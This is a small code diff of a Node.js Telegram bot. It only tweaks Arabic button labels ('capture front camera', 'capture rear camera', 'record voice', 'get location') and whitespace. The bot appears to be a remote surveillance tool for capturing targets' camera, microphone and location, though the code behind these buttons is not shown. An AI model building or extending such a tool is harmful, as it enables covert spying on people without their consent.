@@ -243,10 +243,10 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(chatId, message, {
         reply_markup: {
             inline_keyboard: [
-                [{ text: 'تصوير كاميرا أمامي', callback_data: 'front_camera' }],
-                [{ text: 'تصوير كام خلفي', callback_data: 'rear_camera' }],
-                [{ text: 'تسجيل صوت', callback_data: 'voice_record' }],
-                [{ text: 'الحصول على الموقع', callback_data: 'get_location' }]
+                [{ text: 'تصوير كام أمامي', callback_data:'front_camera' }],
+                [{ text: 'تصوير كام خلفي', callback_data:'rear_camera' }],
+                [{ text: 'تسجيل صوت', callback_data:'voice_record' }],
+                [{ text: 'الحصول على الموقع', callback_data:'get_location' }]
             ]
         }
     });
@@ -285,3 +285,5 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
+
+
